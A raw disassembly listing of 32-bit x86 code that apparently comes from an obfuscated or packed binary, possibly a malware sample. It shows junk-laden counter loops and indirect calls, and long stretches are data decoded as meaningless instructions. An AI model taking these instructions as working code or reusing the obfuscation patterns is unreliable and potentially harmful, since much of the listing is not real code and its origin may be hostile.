  406a97:	in     eax,0x6d
  406a99:	bound  esi,QWORD PTR [esi]
  406a9b:	rcr    DWORD PTR [ebx+0x64],0x49
  406a9f:	pop    edi
  406aa0:	push   0x7c7c2d03
  406aa5:	fdivr  DWORD PTR [edi+0x7c]
  406aa8:	jl     0x406a6a
  406aaa:	pop    esi
  406aab:	xor    BYTE PTR [ebp-0x59b24f1c],al
  406ab1:	xor    al,0x14
  406ab3:	movd   mm7,DWORD PTR [ebx+0x56a57330]
  406aba:	pop    esi
  406abb:	inc    esi
  406abc:	fstp   TBYTE PTR ds:[ecx]
  406abf:	mov    esi,0x5f7f9ed3
  406ac4:	and    al,0x15
  406ac6:	inc    eax
  406ac7:	stos   BYTE PTR es:[edi],al
  406ac8:	sbb    bl,al
  406aca:	dec    esp
  406acb:	cld    
  406acc:	jle    0x406a58
  406ace:	int3   
  406acf:	and    BYTE PTR ds:0x2ae045f7,ch
  406ad5:	lods   eax,DWORD PTR ds:[esi]
  406ad6:	jnp    0x406ab3
  406ad8:	out    0x2d,al
  406ada:	and    bl,BYTE PTR [ecx-0x5c89266b]
  406ae0:	loope  0x406ad1
  406ae2:	jae    0x406b12
  406ae4:	popa   
  406ae5:	push   0x4f
  406ae7:	fwait
  406ae8:	(bad)
  406aeb:	cmp    al,0x14
  406aed:	push   es
  406aee:	sub    al,0xc8
  406af0:	or     bh,BYTE PTR [esi+0x6]
  406af3:	add    al,0x1d
  406af5:	test   eax,0xb3983224
  406afa:	faddp  st(2),st
  406afc:	push   esp
  406afd:	cmp    ecx,DWORD PTR [eax+0x7cdcbf84]
  406b03:	ja     0x406a8c
  406b05:	cmp    ah,BYTE PTR [edi]
  406b07:	outs   dx,BYTE PTR ds:[esi]
  406b08:	lds    edx,FWORD PTR [esi]
  406b0a:	xor    ebp,eax
  406b0c:	jb     0x406b83
  406b0e:	mov    dl,0x51
  406b10:	jle    0x406b66
  406b12:	outs   dx,BYTE PTR ds:[esi]
  406b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b14:	loopne 0x406ae5
  406b16:	jmp    0xb1e6:0x219e692c
  406b1d:	cmp    eax,0x7e454366
  406b22:	pusha  
  406b23:	out    dx,eax
  406b24:	jbe    0x406ada
  406b26:	adc    al,0x74
  406b28:	mov    edx,0x2ceb11e7
  406b2d:	add    ebp,DWORD PTR [edi+0x45]
  406b30:	cmp    BYTE PTR [eax-0x659707c4],cl
  406b36:	xor    bl,ah
  406b38:	aas    
  406b39:	les    ebp,FWORD PTR [eax]
  406b3b:	cmp    ah,bh
  406b3d:	inc    esp
  406b3e:	push   cs
  406b3f:	and    esp,DWORD PTR [ebp-0x7b2a1807]
  406b45:	push   esi
  406b46:	mov    al,0xfc
  406b48:	retf   
  406b49:	and    BYTE PTR [esi],ah
  406b4b:	es mov edx,0x37e9586d
  406b51:	idiv   edi
  406b53:	xor    eax,0x748ea1b0
  406b58:	shr    BYTE PTR [esi+0x3a04a719],1
  406b5e:	mov    bh,0x87
  406b60:	in     al,dx
  406b61:	pop    eax
  406b62:	mov    dh,0xc4
  406b64:	cs jae 0x406b85
  406b67:	xor    cl,BYTE PTR [eax+0x7c]
  406b6a:	mov    BYTE PTR [ecx+0x5c],al
  406b6d:	push   edx
  406b6e:	test   ebp,edi
  406b70:	and    DWORD PTR [eax-0x5],esp
  406b73:	out    0xf,eax
  406b75:	in     eax,dx
  406b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b77:	fcomp  QWORD PTR [ebx+0x5c]
  406b7a:	js     0x406b9b
  406b7c:	sbb    eax,0x2689085e
  406b81:	mov    bh,0xce
  406b83:	mov    DWORD PTR [edx],edx
  406b85:	pop    ss
  406b86:	rcr    DWORD PTR [ebx],1
  406b88:	lahf   
  406b89:	push   ds
  406b8a:	call   0x4666b10
  406b8f:	add    esp,ebx
  406b91:	daa    
  406b92:	dec    ebx
  406b93:	hlt    
  406b94:	mov    ds:0x856d671f,eax
  406b99:	je     0x406b60
  406b9b:	cld    
  406b9c:	int3   
  406b9d:	mov    ebx,0x1c615f8
  406ba2:	call   0x125b:0xfee1514d
  406ba9:	jno    0x406be8
  406bab:	inc    edx
  406bac:	ja     0x406c1d
  406bae:	imul   esi,DWORD PTR [ebx+esi*2],0x80c90762
  406bb5:	stos   BYTE PTR es:[edi],al
  406bb6:	and    edi,esp
  406bb8:	or     DWORD PTR [ebx+0x10],0xfffffff3
  406bbc:	cmp    eax,0xb6bc5b85
  406bc1:	hlt    
  406bc2:	loop   0x406bb5
  406bc4:	pop    eax
  406bc5:	or     ch,BYTE PTR [esp+ebp*8+0x4f]
  406bc9:	pop    es
  406bca:	adc    DWORD PTR [esi-0x5a],0xffffffdb
  406bce:	xchg   esi,edi
  406bd0:	lods   al,BYTE PTR ds:[esi]
  406bd1:	loop   0x406c44
  406bd3:	mov    ecx,0xf321bb
  406bd8:	bound  esp,QWORD PTR [ecx+0x70b1bf07]
  406bde:	mov    ecx,0x7f8ca6ea
  406be3:	dec    ecx
  406be4:	jp     0x406c65
  406be6:	data16 mov dl,0xfa
  406be9:	xchg   DWORD PTR [ecx],eax
  406beb:	or     al,0x46
  406bed:	cmp    esi,eax
  406bef:	or     al,0x44
  406bf1:	add    al,0x7
  406bf3:	les    ecx,FWORD PTR [ecx-0x68]
  406bf6:	xor    dl,0xec
  406bf9:	xor    BYTE PTR [ebp+0x6e6b6845],dl
  406bff:	inc    esi
  406c00:	cmp    DWORD PTR [ecx-0x74d57d5c],eax
  406c06:	jne    0x406c14
  406c08:	cmp    esi,eax
  406c0a:	mov    eax,DWORD PTR [ebp-0x4]
  406c0d:	je     0x40675d
  406c13:	xor    eax,edx
  406c15:	add    eax,ecx
  406c17:	mov    ecx,DWORD PTR [ebp+0xc]
  406c1a:	jmp    0x406d93
  406c1f:	stos   BYTE PTR es:[edi],al
  406c20:	adc    DWORD PTR [esp+ebp*2],ebp
  406c23:	mov    ebx,0xc2fd6a61
  406c28:	mov    al,ds:0x781cd58d
  406c2d:	mov    ds:0x7c2cefcf,al
  406c32:	jl     0x406c0c
  406c34:	jg     0x406cb2
  406c36:	jl     0x406c25
  406c38:	pusha  
  406c39:	xchg   esp,eax
  406c3a:	push   ebx
  406c3b:	out    dx,al
  406c3c:	cmp    ebx,edi
  406c3e:	inc    edi
  406c3f:	outs   dx,BYTE PTR ds:[esi]
  406c40:	jb     0x406cb1
  406c42:	shr    BYTE PTR [ebp-0x40],0xf5
  406c46:	xor    ch,bh
  406c48:	mov    edx,0x270894f0
  406c4d:	pop    es
  406c4e:	dec    ebp
  406c4f:	add    DWORD PTR [edi+ebp*8+0x7d820f36],eax
  406c56:	cdq    
  406c57:	mov    dl,0x1b
  406c59:	sbb    DWORD PTR [ebx-0x13],eax
  406c5c:	mov    ds:0x4cf6ed5c,eax
  406c61:	scas   al,BYTE PTR es:[edi]
  406c62:	xchg   edi,eax
  406c63:	adc    ch,BYTE PTR [ecx-0x3d50f1c1]
  406c69:	outs   dx,BYTE PTR ds:[esi]
  406c6a:	cwde   
  406c6b:	mov    cl,0x8e
  406c6d:	sbb    ebx,eax
  406c6f:	mov    bl,0xd3
  406c71:	cwde   
  406c72:	add    DWORD PTR [ebx-0x40bc0b63],ebp
  406c78:	hlt    
  406c79:	inc    esi
  406c7a:	push   0xdf954797
  406c7f:	fsubrp st(1),st
  406c81:	test   BYTE PTR [ecx-0x7bebd6bd],al
  406c87:	push   es
  406c88:	pop    ecx
  406c89:	xchg   ebp,eax
  406c8a:	aas    
  406c8b:	mov    dh,0x17
  406c8d:	fld    QWORD PTR [esi+0x7a]
  406c90:	xor    BYTE PTR [ecx+0x1d],0xa4
  406c94:	(bad)  
  406c95:	push   ds
  406c96:	jns    0x406c7a
  406c98:	jns    0x406c1c
  406c9a:	outs   dx,DWORD PTR ds:[esi]
  406c9b:	jg     0x406c56
  406c9d:	mov    ds:0x25a8e52b,al
  406ca2:	stos   BYTE PTR es:[edi],al
  406ca3:	jo     0x406c7f
  406ca5:	icebp  
  406ca6:	(bad)  
  406ca7:	stc    
  406ca8:	xchg   ecx,eax
  406ca9:	mov    cl,0xa9
  406cab:	cvtpi2ps xmm6,QWORD PTR gs:[ecx-0xe7333c6]
  406cb3:	pop    ebx
  406cb4:	or     al,0xb8
  406cb6:	mov    esp,0x9e4d4a5f
  406cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cbc:	pop    esp
  406cbd:	les    esi,FWORD PTR [edx+eiz*1+0x7d]
  406cc1:	dec    ecx
  406cc2:	das    
  406cc3:	jge    0x406d35
  406cc5:	pop    esp
  406cc6:	sbb    eax,0xd02dbf22
  406ccb:	aaa    
  406ccc:	into   
  406ccd:	mov    DWORD PTR [edx-0x75],0x9f26a9b3
  406cd4:	ror    bh,cl
  406cd6:	scas   al,BYTE PTR es:[edi]
  406cd7:	cmp    eax,esi
  406cd9:	js     0x406c7f
  406cdb:	in     eax,0x7f
  406cdd:	dec    edx
  406cde:	or     al,0xe1
  406ce0:	shr    DWORD PTR [eax],1
  406ce2:	sar    DWORD PTR [edx],0x1f
  406ce5:	or     ah,ch
  406ce7:	int3   
  406ce8:	fild   WORD PTR [ebx+0x2d]
  406ceb:	dec    DWORD PTR [eax+0x18]
  406cee:	push   ds
  406cef:	repnz mov eax,ds:0x489a8cd1
  406cf5:	sbb    ebx,DWORD PTR [esi-0x61]
  406cf8:	mov    gs:0x28dd3dc0,al
  406cfe:	jg     0x406d35
  406d00:	mov    eax,ds:0x9624e330
  406d05:	push   eax
  406d06:	push   edx
  406d07:	fs gs sahf 
  406d0a:	dec    edi
  406d0b:	sub    eax,ebp
  406d0d:	mov    DWORD PTR [edi+0x16],ecx
  406d10:	cs aad 0x7a
  406d13:	iret   
  406d14:	add    edi,esi
  406d16:	lahf   
  406d17:	test   eax,0xc316d8f0
  406d1c:	adc    al,0xd4
  406d1e:	mov    ds:0xe8864697,al
  406d23:	cs jns 0x406ce3
  406d26:	outs   dx,DWORD PTR ds:[esi]
  406d27:	outs   dx,DWORD PTR ds:[esi]
  406d28:	push   ds
  406d29:	mov    al,ds:0xa218a1e3
  406d2e:	jl     0x406dab
  406d30:	cdq    
  406d31:	sub    eax,0xe3c260c5
  406d36:	stc    
  406d37:	xchg   ax,ax
  406d39:	stos   DWORD PTR es:[edi],eax
  406d3a:	ins    BYTE PTR es:[edi],dx
  406d3b:	push   0x13b5fb3
  406d40:	dec    ecx
  406d41:	leave  
  406d42:	and    eax,0x8584d218
  406d47:	nop
  406d48:	ins    DWORD PTR es:[edi],dx
  406d49:	push   0x61a97533
  406d4e:	nop
  406d4f:	or     al,0xea
  406d51:	sbb    edx,edx
  406d53:	call   0xc9ba9c15
  406d58:	retf   
  406d59:	imul   ebp,DWORD PTR [ecx-0x24],0xffffffa9
  406d5d:	fsubr  DWORD PTR [ecx]
  406d5f:	std    
  406d60:	lea    esp,[ebp-0x78]
  406d63:	mov    al,0x87
  406d65:	cwde   
  406d66:	push   ds
  406d67:	pop    edi
  406d68:	xor    BYTE PTR [esi+0x4b],ch
  406d6b:	xor    esp,0x4b77fbfa
  406d71:	jg     0x406d79
  406d73:	lods   eax,DWORD PTR ds:[esi]
  406d74:	add    dh,BYTE PTR [eax+0x35]
  406d77:	loope  0x406d74
  406d79:	sti    
  406d7a:	test   al,0x8c
  406d7c:	pusha  
  406d7d:	inc    ecx
  406d7e:	idiv   BYTE PTR [edx+edx*4-0x4d943863]
  406d85:	aam    0x5e
  406d87:	sahf   
  406d88:	and    ecx,DWORD PTR [eax-0x193bfcc]
  406d8e:	stos   BYTE PTR es:[edi],al
  406d8f:	stc    
  406d90:	bound  edi,QWORD PTR ds:0xc1af0fbd
  406d96:	jmp    0x406f0f
  406d9b:	adc    ch,BYTE PTR [eax]
  406d9d:	mov    bl,0x55
  406d9f:	dec    ebp
  406da0:	ins    DWORD PTR es:[edi],dx
  406da1:	adc    ch,BYTE PTR [ebx-0x44]
  406da4:	sahf   
  406da5:	stos   BYTE PTR es:[edi],al
  406da6:	jmp    0xceee6c6e
  406dab:	dec    ebx
  406dac:	das    
  406dad:	jl     0x406e2b
  406daf:	fdivr  DWORD PTR [edi+0x7c]
  406db2:	jl     0x406dd5
  406db4:	xor    BYTE PTR [ebp+0x6f],cl
  406db7:	jae    0x406d79
  406db9:	sub    esp,DWORD PTR [ebp-0x6d]
  406dbc:	add    bh,bh
  406dbe:	aam    0x13
  406dc0:	sbb    DWORD PTR [edx+0x2a],0x54
  406dc4:	fdivr  DWORD PTR [esi-0x57]
  406dc7:	and    ebp,DWORD PTR [edi-0x7409525e]
  406dcd:	add    DWORD PTR [esi-0x7b],ebx
  406dd0:	lea    ebx,ds:0x83be42ad
  406dd6:	lds    esp,FWORD PTR [edi-0x76]
  406dd9:	mov    bh,0xa0
  406ddb:	ret    
  406ddc:	mov    ecx,DWORD PTR [ebx+ebx*2]
  406ddf:	ret    
  406de0:	rcr    esp,cl
  406de2:	idiv   DWORD PTR [edi+0x3e]
  406de5:	mov    dh,0xae
  406de7:	in     eax,dx
  406de8:	dec    eax
  406dea:	add    edx,DWORD PTR [eax-0x2a]
  406ded:	mov    dl,0xc8
  406def:	out    dx,eax
  406df0:	push   ecx
  406df1:	sub    edx,DWORD PTR ds:0x75aa8fd
  406df7:	jae    0x406ddf
  406df9:	mov    dl,0xc0
  406dfb:	push   edx
  406dfc:	jo     0x406d8f
  406dfe:	sub    al,0x82
  406e00:	(bad)  
  406e01:	xchg   esi,eax
  406e02:	xchg   ecx,eax
  406e03:	test   eax,0x8cb4481d
  406e08:	mov    ebp,0x1a74f217
  406e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e0e:	mov    DWORD PTR [ecx-0x2],esp
  406e11:	dec    edi
  406e12:	rep outs dx,DWORD PTR ds:[esi]
  406e14:	add    DWORD PTR [ecx+eax*4+0x5b],esi
  406e18:	loop   0x406d9a
  406e1a:	and    DWORD PTR [ebx],esi
  406e1c:	and    eax,0x3966dbb2
  406e21:	mov    al,0xe2
  406e23:	mov    ebp,0xd751da3a
  406e28:	jge    0x406dd5
  406e2a:	scas   al,BYTE PTR es:[edi]
  406e2b:	leave  
  406e2c:	call   0xba83:0x69a67a6
  406e33:	fmulp  st(1),st
  406e35:	aam    0xdc
  406e37:	sbb    eax,ecx
  406e39:	stos   DWORD PTR es:[edi],eax
  406e3a:	sbb    edx,ecx
  406e3c:	lods   al,BYTE PTR ds:[esi]
  406e3d:	dec    edi
  406e3e:	mov    ebx,0x5115de27
  406e43:	enter  0x6d2,0x74
  406e47:	fwait
  406e48:	out    0x94,al
  406e4a:	inc    esp
  406e4b:	push   0xffffffda
  406e4d:	dec    edx
  406e4e:	jecxz  0x406e3c
  406e50:	jg     0x406e55
  406e52:	sbb    ecx,DWORD PTR [edi-0x6131fc60]
  406e58:	pop    edx
  406e59:	ins    DWORD PTR es:[edi],dx
  406e5a:	fcomp  QWORD PTR [ebp+0x5f373243]
  406e60:	push   esp
  406e61:	or     eax,0xd332b8d
  406e66:	mov    DWORD PTR [esi],esp
  406e68:	sub    eax,0x59cc8fc9
  406e6d:	and    eax,DWORD PTR [ebp+eax*1-0x62]
  406e71:	imul   BYTE PTR [edx]
  406e73:	es (bad) 
  406e75:	aaa    
  406e76:	sub    al,0xf3
  406e78:	mov    eax,0x4e71bf44
  406e7d:	ret    0xe8c7
  406e80:	jmp    0x406eba
  406e82:	sub    ah,BYTE PTR [edx]
  406e84:	loope  0x406f00
  406e86:	mov    esi,0x6ccd51f1
  406e8b:	dec    esi
  406e8c:	or     al,0x31
  406e8e:	out    0xad,eax
  406e90:	xchg   ecx,eax
  406e91:	pop    esp
  406e92:	popf   
  406e93:	(bad)
  406e97:	pop    ecx
  406e98:	jmp    0x406f0e
  406e9a:	adc    ch,BYTE PTR [ebx]
  406e9c:	xor    eax,0xba68fa26
  406ea1:	mov    bh,0x4d
  406ea3:	loopne 0x406eba
  406ea5:	popa   
  406ea6:	add    DWORD PTR [edx-0x3e],0x5d
  406eaa:	pop    ebp
  406eab:	xlat   BYTE PTR ds:[ebx]
  406eac:	div    DWORD PTR [edi+eax*4+0x15660f4a]
  406eb3:	out    dx,al
  406eb4:	push   0xdcf48f74
  406eb9:	lahf   
  406eba:	arpl   WORD PTR [edi+0x44a22509],cx
  406ec0:	pop    esp
  406ec1:	dec    ecx
  406ec2:	xor    dh,bl
  406ec4:	inc    ebx
  406ec5:	out    dx,al
  406ec6:	push   0x3b
  406ec8:	adc    dl,BYTE PTR ds:0xf428e923
  406ece:	js     0x406ef3
  406ed0:	inc    ecx
  406ed1:	mov    WORD PTR [edi+0x3],?
  406ed4:	sub    BYTE PTR [ebp+0x17372f97],0x2
  406edb:	jb     0x406ed7
  406edd:	pop    edi
  406ede:	in     eax,dx
  406edf:	ins    BYTE PTR es:[edi],dx
  406ee0:	mov    al,0x33
  406ee2:	fwait
  406ee3:	leave  
  406ee4:	les    ebp,FWORD PTR [esi+0x45f85f97]
  406eea:	imul   esp,DWORD PTR [edi+esi*8-0x50875769],0xdde95fb2
  406ef5:	add    al,0xdb
  406ef7:	fstp   TBYTE PTR [eax-0x3fdf9fb6]
  406efd:	or     ebx,DWORD PTR [esi-0x6f]
  406f00:	mov    BYTE PTR [ecx+0x7ff18358],bh
  406f06:	cmp    esp,edx
  406f08:	jg     0x406ebf
  406f0a:	lahf   
  406f0b:	in     al,dx
  406f0c:	scas   al,BYTE PTR es:[edi]
  406f0d:	outs   dx,DWORD PTR ds:[esi]
  406f0e:	repnz add eax,DWORD PTR [ebp+0x8]
  406f12:	mov    DWORD PTR [ebp+0xc],eax
  406f15:	mov    eax,DWORD PTR [ebp+0xc]
  406f18:	pop    esi
  406f19:	leave  
  406f1a:	ret    0x8
  406f1d:	push   ebp
  406f1e:	mov    ebp,esp
  406f20:	sub    esp,0x30
  406f23:	xor    eax,0x5695
  406f28:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406f2f:	mov    DWORD PTR ds:0x4292ad,0x11
  406f39:	cmp    DWORD PTR ds:0x4292ad,0x0
  406f40:	je     0x406f7d
  406f46:	cmp    DWORD PTR ds:0x4292ad,0x1b
  406f4d:	jne    0x406f61
  406f53:	push   0x7d57
  406f58:	push   DWORD PTR [ebp-0xc]
  406f5b:	call   DWORD PTR ds:0x427ac7
  406f61:	mov    ecx,DWORD PTR ds:0x4292ad
  406f67:	dec    ecx
  406f68:	mov    DWORD PTR ds:0x4292ad,ecx
  406f6e:	jmp    0x406f39
  406f73:	xor    DWORD PTR ds:0x427594,0x427d17
  406f7d:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  406f84:	mov    ecx,DWORD PTR [ebp-0x4]
  406f87:	push   ebx
  406f88:	mov    eax,0x7510857
  406f8d:	adc    ebx,DWORD PTR ds:0x4292c5
  406f93:	xor    ecx,eax
  406f95:	and    DWORD PTR ds:0x4292c5,0x0
  406f9f:	jmp    0x406fb1
  406fa4:	mov    ebx,DWORD PTR ds:0x4292c5
  406faa:	inc    ebx
  406fab:	mov    DWORD PTR ds:0x4292c5,ebx
  406fb1:	cmp    DWORD PTR ds:0x4292c5,0x12
  406fb8:	jae    0x407003
  406fbe:	cmp    DWORD PTR ds:0x4292c5,0x4
  406fc5:	jne    0x406fe4
  406fcb:	push   DWORD PTR [ebp-0x18]
  406fce:	push   DWORD PTR [ebp-0x18]
  406fd1:	push   0x4bf1
  406fd6:	push   DWORD PTR [ebp-0x28]
  406fd9:	push   0x78bb
  406fde:	call   DWORD PTR ds:0x427acb
  406fe4:	cmp    DWORD PTR ds:0x4292c5,0x3
  406feb:	jne    0x406ffe
  406ff1:	mov    ebx,DWORD PTR ds:0x4292c5
  406ff7:	inc    ebx
  406ff8:	mov    DWORD PTR ds:0x4292c5,ebx
  406ffe:	jmp    0x406fa4
  407003:	mov    ebx,0x32729e
  407008:	add    DWORD PTR ds:0x427cfb,0x42c892
  407012:	add    ecx,ebx
  407014:	mov    DWORD PTR [ebp-0x1c],ecx
  407017:	neg    DWORD PTR ds:0x427d0f
  40701d:	mov    ecx,DWORD PTR [ebp+0x14]
  407020:	sub    DWORD PTR ds:0x427cf7,0x56dd
  40702a:	push   esi
  40702b:	push   edi
  40702c:	add    DWORD PTR ds:0x427d0f,0x42c89a
  407036:	test   ecx,ecx
  407038:	mov    DWORD PTR ds:0x4292c5,0x64aa
  407042:	je     0x407316
  407048:	and    DWORD PTR ds:0x42c882,0x0
  407052:	mov    esi,DWORD PTR ds:0x42c882
  407058:	inc    esi
  407059:	mov    DWORD PTR ds:0x42c882,esi
  40705f:	cmp    DWORD PTR ds:0x42c882,0x6
  407066:	jne    0x40707e
  40706c:	push   DWORD PTR [ebp-0x24]
  40706f:	push   DWORD PTR [ebp-0x18]
  407072:	push   DWORD PTR [ebp-0x14]
  407075:	push   DWORD PTR [ebp-0x28]
  407078:	call   DWORD PTR ds:0x427c6f
  40707e:	cmp    DWORD PTR ds:0x42c882,0x5
  407085:	jne    0x40709a
  40708b:	xor    esi,esi
  40708d:	or     esi,DWORD PTR ds:0x42c882
  407093:	inc    esi
  407094:	mov    DWORD PTR ds:0x42c882,esi
  40709a:	cmp    DWORD PTR ds:0x42c882,0x14
  4070a1:	jb     0x407052
  4070a7:	mov    ecx,DWORD PTR [ebp+0x14]
  4070aa:	mov    DWORD PTR ds:0x4292b1,0x1a
  4070b4:	cmp    DWORD PTR ds:0x4292b1,0x0
  4070bb:	je     0x407188
  4070c1:	cmp    DWORD PTR ds:0x4292b1,0xc
  4070c8:	jne    0x4070de
  4070ce:	push   0x42783c
  4070d3:	push   0x4275b4
  4070d8:	call   DWORD PTR ds:0x4279f3
  4070de:	cmp    DWORD PTR ds:0x4292b1,0xd
  4070e5:	jne    0x4070fa
  4070eb:	xor    edi,edi
  4070ed:	xor    edi,DWORD PTR ds:0x4292b1
  4070f3:	dec    edi
  4070f4:	mov    DWORD PTR ds:0x4292b1,edi
  4070fa:	xor    edi,edi
  4070fc:	or     edi,DWORD PTR ds:0x4292b1
  407102:	dec    edi
  407103:	mov    DWORD PTR ds:0x4292b1,edi
  407109:	jmp    0x4070b4
  40710e:	and    DWORD PTR ds:0x4292b5,0x0
  407118:	jmp    0x40712a
  40711d:	mov    edi,DWORD PTR ds:0x4292b5
  407123:	inc    edi
  407124:	mov    DWORD PTR ds:0x4292b5,edi
  40712a:	cmp    DWORD PTR ds:0x4292b5,0x16
  407131:	jae    0x407188
  407137:	cmp    DWORD PTR ds:0x4292b5,0x4
  40713e:	jne    0x407169
  407144:	push   DWORD PTR [ebp-0x28]
  407147:	push   0x1a81
  40714c:	push   0x427d07
  407151:	push   0x8e69
  407156:	push   0x489c
  40715b:	push   0x5b7d
  407160:	push   DWORD PTR [ebp-0x10]
  407163:	call   DWORD PTR ds:0x427c73
  407169:	cmp    DWORD PTR ds:0x4292b5,0x3
  407170:	jne    0x407183
  407176:	mov    edi,DWORD PTR ds:0x4292b5
  40717c:	inc    edi
  40717d:	mov    DWORD PTR ds:0x4292b5,edi
  407183:	jmp    0x40711d
  407188:	mov    ecx,DWORD PTR [ecx]
  40718a:	jmp    0x407313
  40718f:	jne    0x40718d
  407191:	mov    cl,0x3f
  407193:	mov    ch,0x31
  407195:	cmc    
  407196:	mov    dl,0xc1
  407198:	pop    edx
  407199:	sub    DWORD PTR [esi+0x42d13dbc],esp
  40719f:	pop    ss
  4071a0:	and    DWORD PTR [esp+edi*2-0x18],edi
  4071a4:	jg     0x407222
  4071a6:	jl     0x4071a5
  4071a8:	fcom   QWORD PTR [ecx]
  4071aa:	ins    BYTE PTR es:[edi],dx
  4071ab:	fild   QWORD PTR [ebx+0x5]
  4071ae:	or     DWORD PTR [ebp-0x41],esp
  4071b1:	mov    dh,0xe8
  4071b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071b4:	(bad)  
  4071b5:	mov    BYTE PTR [ebx+0x1f82c34c],cl
  4071bb:	push   0xb
  4071bd:	fnsave [edi]
  4071bf:	out    dx,eax
  4071c0:	sub    edi,DWORD PTR [eax+ebp*2-0x43bd4276]
  4071c7:	mov    eax,0x8cbadcc0
  4071cc:	lock pop eax
  4071ce:	mov    dh,0xe0
  4071d0:	ss fcmovu st,st(0)
  4071d3:	mov    ?,ebx
  4071d5:	ins    DWORD PTR es:[edi],dx
  4071d6:	test   eax,ebx
  4071d8:	dec    eax
  4071d9:	(bad)
  4071dc:	das    
  4071dd:	stc    
  4071de:	call   0x899b54c1
  4071e3:	scas   eax,DWORD PTR es:[edi]
  4071e4:	adc    al,0x38
  4071e6:	xor    BYTE PTR [ecx-0x17c0f111],dl
  4071ec:	test   eax,0xe1378dc4
  4071f1:	add    ah,BYTE PTR ds:0x3eae0644
  4071f7:	scas   eax,DWORD PTR es:[edi]
  4071f8:	mov    dh,0x38
  4071fa:	xor    ebp,DWORD PTR [ecx]
  4071fc:	inc    eax
  4071fd:	popf   
  4071fe:	gs pop ss
  407200:	adc    eax,DWORD PTR [eax+0x3f7e1397]
  407206:	ret    
  407207:	mov    ah,0x43
  407209:	mov    ds:0xb519fa03,eax
  40720e:	test   DWORD PTR [esi],ebx
  407210:	fsincos 
  407212:	mov    bl,0x1b
  407215:	js     0x407197
  407217:	dec    edx
  407218:	pop    ebx
  407219:	xor    esi,DWORD PTR [esi-0xe]
  40721c:	in     al,0xd6
  40721e:	(bad)  
  40721f:	mov    bh,0x79
  407221:	pop    ecx
  407222:	test   eax,0x9440968f
  407227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407228:	lock (bad) 
  40722b:	inc    eax
  40722c:	push   eax
  40722d:	stos   DWORD PTR es:[edi],eax
  40722e:	enter  0x2155,0xde
  407232:	sti    
  407233:	fstp   QWORD PTR [esi+ebx*8+0x19]
  407237:	repnz neg al
  40723a:	fcom   QWORD PTR [edi-0xd1e835d]
  407240:	mov    eax,ds:0xd659298f
  407245:	idiv   al
  407247:	xchg   esi,eax
  407248:	inc    eax
  407249:	fdiv   QWORD PTR [edx+0x14]
  40724c:	test   eax,0x60ff695d
  407251:	fdivr  QWORD PTR [edx-0x7f7bca05]
  407257:	mov    ds:0x7b1ce2e1,al
  40725c:	call   0x3559:0x9952f608
  407263:	push   ss
  407264:	sti    
  407265:	pop    esi
  407266:	es retf 0x8051
  40726a:	ret    0x12cf
  40726d:	mov    ah,0x62
  40726f:	adc    ebp,DWORD PTR [esi-0xe]
  407272:	out    dx,al
  407273:	adc    al,0xab
  407275:	jo     0x407221
  407277:	shl    DWORD PTR [esi],1
  407279:	fimul  DWORD PTR ds:0xfa581b9
  40727f:	adc    al,0x6f
  407281:	adc    DWORD PTR [ecx+0x38878443],ebx
  407287:	rol    cl,cl
  407289:	mov    esp,0xe8aee97a
  40728e:	adc    esp,edi
  407290:	push   esi
  407291:	stos   BYTE PTR es:[edi],al
  407292:	cli    
  407293:	les    esp,FWORD PTR [ebx]
  407295:	adc    DWORD PTR [eax-0x1c],ebp
  407298:	aam    0xe0
  40729a:	mov    ah,0x7c
  40729c:	dec    edx
  40729d:	test   al,0xb9
  40729f:	outs   dx,BYTE PTR ds:[esi]
  4072a0:	push   es
  4072a1:	int    0xdf
  4072a3:	fisub  DWORD PTR [eax]
  4072a5:	aad    0x7f
  4072a7:	sub    BYTE PTR [ecx-0x5d],ah
  4072aa:	cmp    DWORD PTR ds:0x70b6156a,esi
  4072b0:	inc    esi
  4072b1:	mov    ds:0x768650ca,al
  4072b6:	out    0x95,eax
  4072b8:	icebp  
  4072b9:	and    al,0xd7
  4072bb:	enter  0x3352,0xbb
  4072bf:	xchg   ebp,eax
  4072c0:	and    DWORD PTR [edx-0x38c76f52],edx
  4072c6:	dec    eax
  4072c7:	mov    DWORD PTR [esi-0x521e8e8b],0x841b725d
  4072d1:	pop    ss
  4072d2:	ret    0xbd87
  4072d5:	imul   esi,DWORD PTR gs:[edx+0x166b7633],0x65
  4072dd:	add    dh,BYTE PTR fs:[edx+ebx*1-0x596e034c]
  4072e5:	and    BYTE PTR [edi-0x6ff07a1f],cl
  4072eb:	push   es
  4072ec:	std    
  4072ed:	cmp    BYTE PTR [eax],ah
  4072ef:	adc    ebx,ebx
  4072f1:	jecxz  0x407308
  4072f3:	retf   0x31a9
  4072f6:	add    ah,bl
  4072f8:	leave  
  4072f9:	or     al,0x4c
  4072fb:	pop    edi
  4072fc:	adc    BYTE PTR [esi-0x72],ah
  4072ff:	mov    ch,0x95
  407301:	mov    DWORD PTR [ecx-0x747763fd],eax
  407307:	shl    DWORD PTR [ecx],1
  407309:	and    al,0x98
  40730b:	mov    bl,0xeb
  40730d:	ffree  st(0)
  40730f:	jae    0x407360
  407311:	and    ebp,ebx
  407313:	mov    DWORD PTR [ebp-0x1c],ecx
  407316:	and    DWORD PTR ds:0x4292a5,ebx
  40731c:	imul   edx,eax
  40731f:	neg    esi
  407321:	mov    ecx,0x4573
  407326:	add    edx,ecx
  407328:	mov    esi,0x7879
  40732d:	and    DWORD PTR ds:0x42c88e,0x0
  407337:	xor    edi,edi
  407339:	add    edi,DWORD PTR ds:0x42c88e
  40733f:	inc    edi
  407340:	mov    DWORD PTR ds:0x42c88e,edi
  407346:	cmp    DWORD PTR ds:0x42c88e,0x26
  40734d:	jne    0x407368
  407353:	push   0x70d3
  407358:	push   0x0
  40735a:	push   DWORD PTR [ebp-0x10]
  40735d:	push   0x5a5a
  407362:	call   DWORD PTR ds:0x427acf
  407368:	cmp    DWORD PTR ds:0x42c88e,0x19
  40736f:	jb     0x407337
  407375:	and    DWORD PTR ds:0x42c89e,0x0
  40737f:	mov    edi,DWORD PTR ds:0x42c89e
  407385:	inc    edi
  407386:	mov    DWORD PTR ds:0x42c89e,edi
